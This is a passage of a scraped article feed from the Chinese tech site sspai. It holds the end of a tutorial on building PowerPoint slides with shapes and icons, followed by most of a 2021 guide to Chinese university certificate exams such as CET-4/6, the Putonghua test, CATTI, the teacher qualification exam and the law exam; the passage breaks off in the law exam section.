src=\"https://cdn.sspai.com/2021/02/19/390a507fb6f6edde1ba82ead8f8d30b7.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2><strong>用好「形状」的三个步骤</strong></h2>\n<p>谈完「形状」和「图标」的使用原则之后，我们来看看实际制作幻灯片时，可以如何运用上述的思路，一步步来完成「图像化」。</p>\n<h2><strong>Step1：以「形状」来建构逻辑关系</strong></h2>\n<p>在我们开始使用「形状」之前，肯定已经先做好「结构化」，也就是梳理完内容信息的逻辑，只不过暂时还是以「文字」为载体来排版而已。这时，我们需要做的，就只是把对于逻辑关系的文字描述，代换成简单的「形状」而已。</p>\n<p>一般来说，都是以圆形、矩形、圆角矩形作为关键词的节点，依据不同的逻辑关系，分别以线条或箭头来连结。</p>\n<p>那在实际操作上，该怎么做呢？以 PPT 来说，如果是相对简单的逻辑关系，直接用PPT的「形状」功能插入几何形状就可以了；如果是相对复杂的逻辑关系，慢慢插入形状可能略嫌繁琐，可以直接在「SmartArt」找合适的逻辑图来呈现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/3cd2e29498fa372bbae0dd8bc8a23804.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2><strong>Step2：以「图标」来表达抽象概念</strong></h2>\n<p>做完第一步以后，你会得到由关键词和形状所构成的逻辑图。如果关键词本身足够具体清晰，那就可以跳过这一步。但如果关键词本身属于比较抽象的概念，那再搭配「图标」的呈现，更有助于观众的理解。</p>\n<p>那我们该去哪找合适的「图标」素材呢？</p>\n<p>在 PPT 的「插入」选项卡，就能找到 PPT 自带的「图标」来使用。作为微软官方出品的图标库，至少常见类别的图标还是比较齐全的，而且整体的风格一致性也比较好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/7c1e74bbafe85be359af11ac8fd731aa.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>如果 365 自带的图标库不够用，你也可以到知名的图标资源网站下载。比如：<a href=\"https://thenounproject.com/\">Noun Project</a>、<a href=\"https://www.iconfont.cn/\">iconfont</a>、<a href=\"https://icons8.cn/\">icon8</a> 等。不过，由于资源网站的图标素材，往往是由不同设计师制作上传的，在风格造型的细节上，可能会有所不同。</p>\n<p>因此，还是尽量找同一位设计师制作的、成套的图标素材（比如下图 iconfont 首页就有展示同设计师做的一整组图标），或者尽可能挑选风格相近的，以免制造多余的噪声，让画面变得杂乱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/a296b6e02f56eb04f34e24317003582d.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2><strong>Step3：做好「形状」和「图标」的「简化─聚焦」</strong></h2>\n<p>做完第二步，其实已经大致完成这一页幻灯片了。不过，很多逻辑图本身是比较复杂的，如果没有适时切换目光焦点，哪怕做了逻辑图，观众也会有不知从何看起的感觉。因此，我们还是得再做「简化─聚焦」才行。</p>\n<p>那么，我们该如何做好「形状」和「图标」的「简化─聚焦」呢？还记得第二篇提到的「排版四原则」吗？只要用其中的「重复」和「对比」就可以，也就是做格式的「简化─聚焦」。</p>\n<p>在「简化」的部分，我们以「重复」原则，分别统一「形状」和「图标」的格式，比如：缩成同样的大小、将颜色都改成浅灰等，在 PPT 的功能上，也同样是用格式刷、设置默认格式来做。</p>\n<p>在「聚焦」的部分，当然就是用「对比」原则突出重点。比如：放大形状和图标、改成鲜明的颜色等。你可以预先将复制好几页相同的幻灯片，在不同页面用这种「聚焦」的手法，来突出你当下讲述的重点。甚至还可以搭配「平滑」切换，做出类似重点轮播的效果。</p>\n<h2><strong>实战案例</strong></h2>\n<p>上面所说的三个步骤，就是用「形状」和「图标」来做「图像化」的流程，我们还是用一个简单的案例来看：</p>\n<p>这是关于活动方案的幻灯片，已经经过「结构化」的整理了。我们可以看到，这三点活动方案中，不同方面的描述。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/8e0855a064c2951bad246018bc7d6f08.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>从逻辑上来说，这三段描述是比较简单的并列关系，所以要用「形状」来替换的程度并不大。我们直接取三个小标题，加个圆角矩形框住，再沿用原本并列的排版就可以。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/24a7774381e0f9026e9cd3f47f314de4.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>接着，我们找到符合这三个小标题的图标，替换进圆角矩形之中，原先的文字则作为补述放在底下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/fc54d89f94a8b17680d6d3483bf55c2b.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>最后，我们调整圆角矩形、图标和文字的格式，先淡化其他两个方面的部分，让观众能一眼看到，当下讲到的部分是「视觉呈现」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/55f768d0f320b92fe3c942b0bed9fb10.gif\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/eb1283b96ac80d1a91514081d75855c1.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>用同样的方式，处理另外两个部分的页面。如此一来，在讲到不同方面的描述时，只要简单切换页面，就能让观众的焦点随之移动了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/65f6411e17e4d657efba108c6aa681f0.gif\"></figure><h2><strong>小结</strong></h2>\n<p>在这篇文章中，我们谈到在「图像化」的阶段，可能还需要「图片」以外的图像元素，来表达逻辑关系和抽象概念，也就是用「形状」和「图标」。</p>\n<p>接着，我们进一步谈到，不同的图像元素，因为在视觉细节上的差异，各有不同的使用逻辑。同时，也从信息角度分析出「形状」和「图标」分别该怎么处理，才能避免产生多余的噪声。</p>\n<p>最后，我们同样归纳出三步骤：</p>\n<ol>\n<li>先把文字描述中的逻辑关系，以「形状」建构；</li>\n<li>再将其中的抽象概念，以「图标」来表达；</li>\n<li>再辅以「简化─聚焦」原则，更好地引导观众的视线。</li>\n</ol>\n<p>以上就是用「形状」和「图标」来完成「图像化」的方法。</p>\n<p>现在，我们已经分别处理好文字信息中的具体细节（图片）、逻辑关系（形状）和抽象概念（图标）。而下一篇文章，我们来谈谈最后一个图像元素，也就是该如何用「图表」来分析数据变化。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68263"},{"title":"开学季｜证多不压身，聊聊大学里值得「拼一拼」的证书考试","date":"2021-08-17 06:30:00","description":"\n<p>无论你是怀着无比激动的心情奔赴大学校园的萌新，还是一两年后重返校园的一条咸鱼，考试都会成为大学生活中绕不开的一个话题。尽管大学期间不再是「考考考，老师的法宝」，但是多如牛毛的资格型、水平性考试仍然十分受到大家青睐，毕竟人人都说「证不压身」。因此，我们从许多类似的考试中，选出了几门我们认为比较重要的、值得一试的，跟大家介绍一下它们的情况，希望能够对你的大学生活有所帮助。</p>\n<p>我们今天要谈到的考试是以下七种：</p>\n<ul>\n<li>大学英语等级考试（四六级）</li>\n<li>普通话水平测试</li>\n<li>全国计算机等级考试（通称「计算机 X 级」）</li>\n<li>国家统一法律职业资格考试（「法考」）</li>\n<li>注册会计师全国统一考试（CPA）</li>\n<li>全国翻译专业资格（水平）考试（CATTI）</li>\n<li>中小学教师资格考试（通称「教资」）</li>\n</ul>\n<p>我们会从报名、用处和一些过来人的备考建议几个方面，说一说这些考试。当然，其中的法考、CPA 和计算机二级我没有亲身经历过，所以是在网上找了比较权威的资料进行了一些考试情况的整合，也咨询了一些自己的大佬朋友，在此也对他们表示由衷谢意！</p>\n<p>当然，我在这里说得再多也不过是一家之言。少数派的各位社会大佬们如果有任何意见、建议，也请不要吝啬，在评论区尽情施展你的才华 —— 我一个人的力量毕竟有限，但是我真的很想让这篇文章能够变成大家值得参考的攻略。</p>\n<h2>大学英语等级考试（四六级）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uql5b34tfv4jeuqv0.png\"></figure><blockquote><p>大学英语考试是一项大规模标准化考试，是一个「标准关联的常模参照测验」。大学英语四、六级考试作为一项全国性的教学考试由「国家教育部高教司」主办，分为四级考试（CET-4）和六级考试（CET-6），每年各举行两次，分别在同一天的上午和下午进行。从 2005 年 1 月起，成绩满分为 710 分，由国家教育部高教司委托「全国大学英语四六级考试委员会」给每位考生发成绩单。</p></blockquote>\n<h3>报名方式与费用</h3>\n<p>大学英语等级考试是只能由在读大学生报名的，社会人员一般不能参与。根据就读学校的不同，对考生报名大学英语考试的条件可能会有不同的限制，比如某些大学可能不允许大一新生报名；或者是某些大学对报名学生的高考英语成绩有所限制。每个学校执行的政策必然不同，所以请咨询学长学姐、辅导员或者教务处后确定。</p>\n<p>四六级笔试时间是每年的 6 月和 12 月的第二个星期六，口试的时间是每年的 5 月和 11 月；报名时间则需要关注相关信息。报名的网站在 <a href=\"http://cet-bm.neea.edu.cn/\">这里</a>。可能并非所有学校都用这个网站进行四六级报名，需要注意你所在学校的具体报名要求。</p>\n<p>费用方面，不同省份的大学在收费上略有不同，笔试一般是在 20-40 元的范围内。口语考试则是在 50 元左右。</p>\n<p><strong>英语、（英语）翻译专业一般不能报名大学英语四六级考试。</strong></p>\n<h3>这个考试有什么用？</h3>\n<ul>\n<li>\n<strong>毕业</strong>：有些学校可能会把四六级考试的成绩与毕业挂钩，需要仔细考虑毕业条件，尽早通过考试。通过考试的标准为 425 分（满分 710 分）。</li>\n<li>\n<strong>英语水平证明</strong>：大学英语四六级的分数可在求职时用于证明英文水平。关于多少分可以证明英语水平较高，众说纷纭。不过如果（笔试）能够考到 550 分乃至 600 分的话，会被认为是较高的分数。</li>\n<li>\n<strong>研究生英语免修</strong>：不少大学的研究生英语课程可以通过四六级成绩水平的方式免修。我所在的学校要求两年内六级（笔试）成绩 600 分以上，仅供参考。</li>\n</ul>\n<h3>考试流程</h3>\n<h4>笔试</h4>\n<p>四六级笔试的题型相同，但是题目中的材料题材和体裁可能有所不同，形式为纸笔考试。<a href=\"http://cet.neea.edu.cn/res/Home/1704/55b02330ac17274664f06d9d3db8249d.pdf\" target=\"_blank\">这里 </a>可以下载到最新的考试大纲。</p>\n<p>针对试卷结构中涉及到的各类题型，说几点建议：</p>\n<ul>\n<li>\n<strong>写作</strong>：四级写作 120 词、六级写作 150 词，注意不要写得太长（有字数上限）或者太短，同时紧扣题目本身写，不需要过难的词汇和语法，但是需要保证准确、明晰表达自己的意思。</li>\n<li>\n<strong>听力理解</strong>：四六级的听力理解中，常有<strong>只说一遍</strong>的情况，所以一定要集中注意力，听懂段落、对话的意思；同时，问题本身也是需要听的，这可能是比较难的地方，可以训练通过选项对问题进行预判的能力。此外，考试时可能需要自己佩戴耳机，注意提前调整听力耳机的频段，以免出现错误。</li>\n<li>\n<strong>阅读理解</strong>：选词填空需要准确理解每个词的意思，并且根据语境填入即可，基本只是在考单词。匹配则是看对于篇章的理解程度，并不需要细节，不要用大量时间细读长文，根据逻辑和上下文进行选择匹配。单选则需要在文章中找到选项的依据再进行作答，一定要细心。</li>\n<li>\n<strong>翻译</strong>：四六级的翻译都是汉译英，并不涉及英译汉。话题以中国文化和社会生活为主，所以可以研究一下一些热点中国文化词汇的英语表达是什么。翻译时注意关键信息的准确，以及对汉语特殊句式的转化。</li>\n</ul>\n<h4>口试</h4>\n<p>四六级口试的流程各有不同。四级口试包括「自我介绍」「短文朗读」「简短回答」「个人陈述」和「双人互动」5 个任务，而六级考试则是「自我介绍和问答」「陈述和讨论」「问答」三个部分。</p>\n<p>四六级口试中有两人互动的环节。由于考生是随机编排成组，总是有那么一些运气的成分在里面，一人的口语考试可能会受到另一人的影响。不过，考官也会根据每人的具体表现酌情给分，所以需要配合的环节你还是可以尽量展示出自己的实力。</p>\n<p>四六级口试并非强制每位同学都要参加。如果同一周期内没有参加口试的话，最后成绩单上就不会有口试成绩报告。一般来说，证明英语水平或者申请英语免修的情况下，用笔试成绩即可。</p>\n<h2>普通话水平测试</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uqllb34tfgdh4vo70.png\"></figure><p> </p>\n<blockquote><p>普通话水平测试（Putonghua Shuiping Ceshi; PSC）是对应试人运用普通话的规范程度、熟练程度的口语考试。考试形式为口试。普通话水平等级分为三级六等，即一、二、三级，每个级别再分出甲乙两个等次；一级甲等为最高，三级乙等为最低。</p></blockquote>\n<h3>报名方式与费用</h3>\n<p>如果你是大学生，那么很可能在你的学校就有普通话水平测试的考点。我当时的报名是通过学校内部系统进行的（通常是在教务系统中的「考试报名」板块）。所以如果你想报名参加学校考点的考试，可以咨询学校教务或者是学校考点办公室得到报名方式。对于学生来说，报名需要缴纳的费用是 25 元，不过我也看到有些地方的收费是 30 元，具体应该以学校的收费标准为准。</p>\n<p>如果你是社会人士，那么可以通过登录你所在省（自治区、直辖市）的「语言文字测试网站」查询考试报名信息和考试时间，以及咨询距离你最近的考点等等信息。对于社会人士，报名费通常是 50 元。</p>\n<p>普通话水平测试一年举行很多次。各省（自治区、直辖市）举办考试的时间、地点可能不同，因此报名时需要注意。</p>\n<h3>这个考试有什么用？</h3>\n<ul>\n<li>\n<strong>教师资格认证</strong>：对于非语文学科的教师，至少达到二级乙等水平；对于语文学科的教师，要求至少达到二级甲等水平。</li>\n<li>\n<strong>播音主持</strong>：省级及以上广播电视台的播音员、主持人，需要达到一级甲等水平；其他，需要达到一级乙等水平及以上。</li>\n<li>\n<strong>国家工作人员</strong>：需要达到三级甲等以上。</li>\n</ul>\n<h3>考试形式与流程</h3>\n<p>考试形式为上机测试。据说使用的是科大讯飞的语音识别技术，可以准确识别语音语调信息，做到前三部分的自动化阅卷。</p>\n<p>考试的大致流程如下：</p>\n<p><strong>1. 读单音节字词 100 个。</strong>（10 分）</p>\n<p>这一阶段是单音节字词，不会出现特别难读的字。需要在 3.5min 内读完，对语速有一定的要求。但是语速不能过快，因为需要把每个字音都读得足够饱满，才能够得分。</p>\n<p>练习提示：教材上的示例练习，请同伴帮忙计时，控制自己的语速。</p>\n<p><strong>2. 读双音节词语 50 个。</strong>（20 分）</p>\n<p>这一阶段是双音节词语，这一阶段中容易出现的一些错误是：轻声、儿化音和上声变调。轻声的情况可能会与平常我们说话时有些感知不同，需要加强练习；儿化音的话北方同学应该不用过分担心（南方同学可能需要练习一下）；上声变调不用过分担心（如果你根本不知道这是什么，那就更不必担心了）。时限是 2.5min。</p>\n<p>练习提示：轻声需要尤其注意，同时注意控制语速，读音饱满。</p>\n<p><strong>3. 朗读。</strong>（30 分）</p>\n<p>这一阶段是从 60 篇语篇中随机调出一篇进行朗读。朗读不用过分追求有感情和戏剧化效果，但是需要把字音、断句、标点读准。注意观察文章的标点符号，及时调整自己朗读的语调、语速，这些都是得分 / 扣分点。</p>\n<p>练习提示：如果对这一部分实在没有信心，可以通读 1-60 号材料，每天熟悉 1-2 篇。</p>\n<p><strong>4. 说话。</strong>（40 分）</p>\n<p>这一阶段是从两道题目中选择一道，围绕主题开始口语表达。这一部分是唯一人工评定的部分。说话要说 4 分钟（至少 3 分钟），按照普通语速，在 450-600 字。说话要注意不能偏离主题，同时一定注意自己的语速、语音、语调；要在一开始的时候声明自己选择的题目。</p>\n<p>练习提示：可以请自己的朋友听自己的口语表述并给出建议，通过多次练习消减紧张感。</p>\n<p>此外，我记得当时在考试前会进入准备室，在准备室中可以拿到一本新华字典和自己一会儿抽到的题目，可以最后查一查不确定的字。但可能并不是每个考点都有这样的机会。</p>\n<p>考试结束后一般一两个月会得到成绩，再过一段时间就可以领取自己的证书。</p>\n<h3>等级对应分数标准</h3>\n<ul>\n<li>一级甲等：97-100 分。这一级别机考通常给不出来，需要专家评定和复试。北京市的规定是，持有一级乙等证书的应试人员可报名参加复试。其他省（自治区、直辖市）的具体情况需要咨询各省级语言文字应用委员会。</li>\n<li>一级乙等：92-96.99 分。</li>\n<li>二级甲等：87-91.99 分。</li>\n<li>二级乙等：80-86.99 分。</li>\n<li>三级甲等：70-79.99 分。</li>\n<li>三级乙等：60-69.99 分。</li>\n</ul>\n<h3>备考教材</h3>\n<p>有一本教材《普通话水平测试专用教材》可用，同时考试大纲也在网上可以找到。部分地区报名时即可一起购买。教材中包括了一些应试技巧，不过如果希望能够自己练习，也可以参考以下互联网公开资源。</p>\n<h4>互联网资源</h4>\n<ul>\n<li><a href=\"http://www.gov.cn/gongbao/content/2004/content_63130.htm\">考试大纲</a></li>\n<li><a href=\"https://www.douban.com/note/347219581/\">朗读六十篇（生僻字有注音）</a></li>\n<li><a href=\"http://ahywpc.ahedu.gov.cn/showarticle.asp?id=278\">话题三十个</a></li>\n<li><a href=\"http://ahywpc.ahedu.gov.cn/showarticle.asp?id=918\">儿化音表</a></li>\n<li><a href=\"http://ahywpc.ahedu.gov.cn/showarticle.asp?id=919\">轻声词表</a></li>\n</ul>\n<h2>全国计算机等级考试（二级，Office 应用）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uqltb34tfgdh4vo7g.png\"></figure><p>是不是每个人都会在简历的底栏「计算机」技能一栏，写上自己「熟练使用 Office」？无论这一表述「水分」几何，你都可以通过全国计算机等级考试（二级，MS Office 高级应用与设计）来证明自己的 Office 套件应用水平。</p>\n<blockquote><p>全国计算机等级考试（National Computer Rank Examination，简称 NCRE），是经原国家教育委员会（现教育部）批准，由教育部考试中心主办，面向社会，用于考查应试人员计算机应用知识与技能的全国性计算机水平测评体系。</p></blockquote>\n<p>当然，除了 Office 应用之外，二级考试还包括程序设计（C、Java、Access 数据库、C++、MySQL、Web 程序、Python）和 WPS Office 高级应用；此外，计算机等级考试还有一级、三级与四级。具体的级别与对应考试情况可以到 <a href=\"http://ncre.neea.edu.cn/html1/folder/1507/909-1.htm\">这里</a> 查看。</p>\n<p>及格标准为单科 60 分，一、二、三级考试均通过一科即可获得相应科目的证书；四级考试需要先获得三级的相应科目证书后才可参加。</p>\n<h3>报名</h3>\n<p>报名时间到网络上报名，具体的报名网站可以参考 <a href=\"https://ncre-bm.neea.cn/\" target=\"_blank\">这个</a><a href=\"https://ncre-bm.neea.cn/\">网页</a>，每个省（自治区、直辖市）的报名相对独立分开，需要关注你所在省（自治区、直辖市）的相关规定。</p>\n<h3>MS Office 高级应用与设计</h3>\n<p>根据 2021 版本大纲，该科目主要考察的是 Word、PowerPoint 和 Excel 三款软件。考试环境是<strong>中文版 Windows 7</strong>，Office 版本是 <strong>Microsoft Office 2016</strong>。由于目前大家买到的电脑一般预装 Windows 10 和 Office 2019（其实 Windows 11 都已经在路上了），版本较新，区别较大，所以<strong>建议在备考的过程中安装一个虚拟机 Windows 7 和 Office 2016 进行模拟操作演练</strong>。</p>\n<p>具体的考点可以参考 <a href=\"http://ncre.neea.edu.cn/res/Home/2012/af7838a761d65023466a417e4ad461d7.pdf\" target=\"_blank\">这个文档</a>，其中对考点有简明扼要的说明。如果你甚至还不知道这些功能是什么的话，建议参考专门的 Office 教程和帮助文档。</p>\n<p>比如 Excel 的考点 13 — 使用 Power Pivot 管理数据模型的基本操作、考点 4 — 工作簿和工作表的保护、版本分析和比较；PowerPoint 的考点 6 — 演示文稿的审阅和比较；以及 Word 的考点 8 — 多窗口和多文档的编辑，文档视图的使用 —— 这些考点对我们来说可能并不是特别熟悉。</p>\n<p>此外，除了科目中与 Office 直接相关的题目外，选择题型中还有 10 题是计算机基础知识方面的题目。如果对计算机的基础知识不算特别了解，建议还是看一下相关公共基础知识的书籍。</p>\n<h2>全国翻译专业资格（水平）考试</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uqm5b34tfv4jeuqvg.png\"></figure><p> </p>\n<blockquote><p>全国翻译专业资格（水平）考试（简称 CATTI）是受中国国家人力资源和社会保障部委托，由中国外文局负责实施与管理的一项国家级职业资格考试，已纳入中国国务院职业资格目录清单，是一项在全国实行的、统一的、面向全社会的翻译专业资格认证，是对参试人员口译或笔译双语互译能力和水平的评价与认定。</p></blockquote>\n<h3>考试报名与形式</h3>\n<p>翻译专业资格考试采用网上报名的形式。在规定的时间内登录网站填写信息报名即可。</p>\n<p>考试的时间上，根据参加语种的不同，考试的时间分布也略有不同。其中，英语科目每年 6 月（上半年）和 11 月（下半年）考两次（但是英语一级只在上半年可以考）；但是其他小语种每年只考一次：日、法、阿拉伯、葡萄牙语是上半年考试，俄、德、西班牙、韩国语/朝鲜语则是下半年考试。请务必注意自己所要报考语种的报名时间，以免贻误。</p>\n<p>每个语种的考试都分为三个等级：一级、二级、三级，一级为最高等级。考试也分为口译和笔译两种形式，每次报名只可参加其中的一个级别、一种形式的考试。</p>\n<h3>这个考试有什么用？</h3>\n<ul>\n<li>\n<strong>翻译专业的研究生</strong>（翻译硕士，MTI）：需要在在校期间取得该考试口译或笔译二级证书。</li>\n<li>\n<strong>语言水平（翻译水平）证明</strong>：一些机关单位或者企业会以翻译考试的水平作为应聘条件，尤其是翻译相关的职位。一些英文媒体编辑相关的职位，考虑到实际上可能的工作内容，也可以用这个考试来作为英语水平的证明。</li>\n</ul>\n<h3>笔译考试流程</h3>\n<p>CATTI 考试均为机考。如果你对键盘输入某些非拉丁字母体系的语种（比如俄语、韩语、日语等）还不够熟悉，那一定要先熟悉相对应语言的键盘布局与基本键位输入操作。CATTI 考场所用的计算机上会预装多种语言的输入法，届时也会有详细的说明教你切换。</p>\n<p>由于我只考过笔译考试，所以说一下笔译考试的大致流程。笔译考试的合格标准为「笔译综合能力」和「笔译实务」两科同时达到 60 分。尽管都是以 60 分为合格标准，后者比前者难度相对来说更大一些。根据官方数据，CATTI 笔译的通过率在 <strong>10%-20%</strong>，不同语种和级别会有一定的差异。</p>\n<h4>笔译综合能力</h4>\n<p>笔译综合能力基本就是一门外语的语法、词汇知识，考试时间为 120 分钟。英语二级的词汇量要求是 8000 词，不过在做题的过程中，我感觉这个词汇的难度还是比较大的：很多词我们在平时可能不会经常用到，所以比较陌生，需要有针对性地复习。在复习备考的过程中，我也发现词汇方面的题目经常出现同根词，所以这或许是一个比较好的入手复习词汇的角度。</p>\n<p>综合能力的题型一共是四种：词汇替换、语法改错、完形填空，还有阅读理解。</p>\n<h4>笔译实务</h4>\n<p>二级笔译的笔译实务是两篇外译汉与两篇汉译外，考试时间为 180 分钟。笔译的话题比较「无所不包」，但是总体上来说，英文的原文选自一些国外知名媒体或者杂志，以经济、文化方面的题目为主；中文的原文则选自国内权威媒体，以时政热点为主。备考时可以有针对性地准备。文章的难度一般，用词也会比综合能力考试简单一些，而且可以携带纸质词典入场；所以，翻译任务本身还是要注重「信、达、雅」。</p>\n<h3>在线资源</h3>\n<p><a href=\"http://www.catticenter.com/cattidgyt\">CATTI 各语种、级别的大纲以及样题</a></p>\n<h2>中小学教师资格考试</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uqm5b34tfgq1n87dg.png\"></figure><blockquote><p>中小学教师资格考试，考查申请人是否具备教师职业道德、基本素养、教育教学能力和教师专业发展潜质。严把教师入口关，择优选拔乐教、适教人员取得教师资格。中小学教师资格考试包括幼儿园教师资格考试、小学教师资格考试、初级中学教师资格考试、高级中学教师资格考试。</p></blockquote>\n<h3>报名</h3>\n<p>选择科目。除了类别，各类教师资格证还有学科的区别。笔试科目中，必考的综合素质与教育知识与能力（中学）、教育教学知识与能力（小学）、保育知识与能力（幼儿园）是统一的题目；而科目三（中学）「学科知识与教学能力」是分科的，初中分为 15 个学科，高中分为 14 个。</p>\n<p>笔试报名。报名时登录你所在省（自治区、直辖市）的报名系统进行报名，具体各省（自治区、直辖市）报名网站会汇总在 <a href=\"http://ntce.neea.edu.cn/html1/folder/1507/1076-1.htm\">这个</a> 网页上。报名时注意仔细选择自己报考的科目，根据实际需求进行选择。</p>\n<p>面试报名。笔试成绩合格后，才可以进行面试报名。笔试成绩合格的标准是单科 70 分（满分 120 分），需要所有笔试科目都合格之后才可以报名面试，报名时间是笔试成绩公布后的几天。笔试成绩 2 年内有效，所以如果这次面试没有报名，还可以参加之后的面试。</p>\n<h3>这个考试有什么用？</h3>\n<ul>\n<li>只有通过相对应科目和类别的考试，才有可能进行相应科目和类别的中小学教师资格认定。资格认定需要的其他条件包括：学历、普通话、体检合格。这一资格是在国内公立中小学任教所必需的条件之一。</li>\n<li>根据最近出台的政策，即使去学科类教育机构任职，也需要取得对应科目和类别的中小学教师资格。</li>\n</ul>\n<h3>考试流程</h3>\n<h4>笔试</h4>\n<p>笔者于今年 3 月参加了语文（高级中学）的笔试，科目一、二、三是在同一天进行，题量很大，所以一定要准备好笔和墨水。纸笔测试，不用计算机；但是有选择题，所以要视情况携带 2B 涂卡铅笔。</p>\n<p>每一科目的考试时间都是 120 分钟。要写的文字非常多，如果写字的速度比较慢的话，建议考前多练习，好好分配时间。</p>\n<ul>\n<li>\n<strong>科目一｜综合素质</strong>：考察的是教师相关的综合素质知识，个人认为比较简单。选择题主要是法律相关知识，还有一些逻辑和百科知识方面的内容。问答题中，有一题有关教师道德，有一题有关教学观，这两道题目可以有针对性地准备。此外，阅读理解的难度也不大，作文不写偏题即可。整体考下来就好像先考了思想品德，后半程考了语文。</li>\n<li>\n<strong>科目二｜教育教学知识与能力</strong>：主要是教育学和发展心理学的相关内容，包括教育学理论、心理学理论、中学生心理特点等等。这部分的准备，建议上网找找教材或者网课，针对重难点进行复习记忆。记忆量尽管比较大，但是考察的时候都比较基础，不会特别灵活，所以死记硬背就很有效。</li>\n<li>\n<strong>科目三｜学科知识与教学能力</strong>：不同学科的内容不同，但是主要包括学科基础知识、学生作业的批改与教案设计。不同学科之间的差异很大，具体的答题技巧和解题思路也千差万别，我不能一概而论，建议参考相关的教材与学习材料中的有关说明。</li>\n</ul>\n<h4>面试</h4>\n<p>我的面试没有通过。不过，也算是体验了一把面试的流程。面试的流程是先抽题，然后进入备考室备考，根据自己抽到的题目撰写教案，所以一定要带一只好用的笔。</p>\n<p>进入面试教室之后，先是「结构化面试」，需要回答现场随机抽取的 2 个问题，可能涵盖时政热点、教学问题以及处理师生矛盾等等。问题不会特别难，但是也还是建议提前准备一下答题的方式、套路以及时长，通常来说可以参考网上购买的教程。</p>\n<p>之后进入试讲。这个部分时长是 10 分钟，你需要按照自己的教案，结合抽到的题目的要求（会有不同的课型，比如预习课、新课、复习课、试题课等等）进行试讲。试讲过程中需要假装台下坐着学生并且进行演示性的互动。试讲环节结束后进入答辩，台下三位老师会根据你的试讲情况进行提问。</p>\n<h2>国家法律资格从业统一考试</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c49uqmdb34tfgq1n87e0.png\"></figure><p>注：我没有参加过这个考试，也并非相关专业，以下所有表述均来自网络上的权威来源。所以，有关如何复习备考，我无法给出具体的建议。</p>\n<h3>报名条件与方式</h3>\n<p>根据 2018 年发布的《<a href=\"http://www.moj.gov.cn/pub/sfbgw/jgsz/jgszzsdw/zsdwgjsfkszx/gjsfkszcfg/202106/t20210622_428245.html\" target=\"_blank\">国家统一法律职业资格考试实施办法</a>》，报名法考的条件中最重要的一条（也是 2018 年法考改革的重点内容之一）是<strong>学历</strong>、<strong>专业</strong>和<strong>从业经验</strong>要求，即须符合下列三项条件之一：</p>\n<ol>\n<li>具备全日制普通高等学校法学类本科学历并获得学士及以上学位；</li>\n<li>全日制普通高等学校非法学类本科及以上学历并获得法律硕士、法学硕士及以上学位；或者</li>\n<li>全日制普通高等学校非法学类本科及以上学历并获得相应学位且从事法律工作满三年。</li>\n</ol>\n<p>不过，不符合这个条件的人也可能可以报考。例如按照「新人新办法，老人老办法」，在《实施办法》公布实施之前符合旧司考报名资格的仍然可以报考；此外，每年司法部发布的《国家统一法律职业资格考试公告》还会对报考资格作具体规定，司法部还会发布关于相关报考政策的 <a href=\"http://www.moj.gov.cn/pub/sfbgw/zcjd/202105/t20210531_424853.html\" target=\"_blank\">问答</a>，建议仔细查阅。</p>\n<p>与其他全国性统一考试类似，报名需要登录你所在省（自治区、直辖市）的专门报名网站。这些报名相关的信息可以在 <a href=\"https://nje.examos.cn/EXAMSF/public/index.jsp\" target=\"_blank\">这里</a> 找到。</p>\n<h3>这个考试有什么用？</h3>\n<p><strong>获得法律从业资格</strong>。经过 2018 年的改革，需要取得法律职业资格的人员由法官、检察官、律师、公证员扩大到从事行政处罚决定审核、行政复议、行政裁决的工作人员，以及法律顾问、法律类仲裁员。具体而言，初任法官、初任检察官，申请律师、公证员执业，在行政机关中初次从事行政处罚决定审核、行政复议、行政裁决、法律顾问的公务员，以及担任法律类仲裁员的，都需要通过法考取得法律职业资格。</p>\n<p>不过，实践中也有很多在非诉讼领域执业的律师、公司法务等，在未取得法律职业资格前就上岗工作的情况；除了存在不能代理出庭、签署法律意见书等限制，其他并无实质影响。即使如此，不少用人单位在招聘条件、待遇和职级发展上仍会以此为重点条件；因此如果你有志于从事法律相关工作，通过法考、取得法律职业资格仍然是应优先考虑完成的事项，</p>\n<h3>考试环节</h3>\n<p>法考有两个环节的考试，客观题和主观题。两个环节并不在一起考，而是先客观题后主观题。两个环节均采用机考的方式进行。比较人性化的是，主观题作答可以使用拼音、五笔甚至仓颉、速成这种小众的输入法。</p>\n<h4>客观题</h4>\n<p>根据 2021 年的考试大纲与报考公告，客观题一共两套试卷，同一天上下午进行。两套试卷的考试时间均为 180 分钟，每张试卷 100 道试题，分值为 150 分，其中单项选择题 50 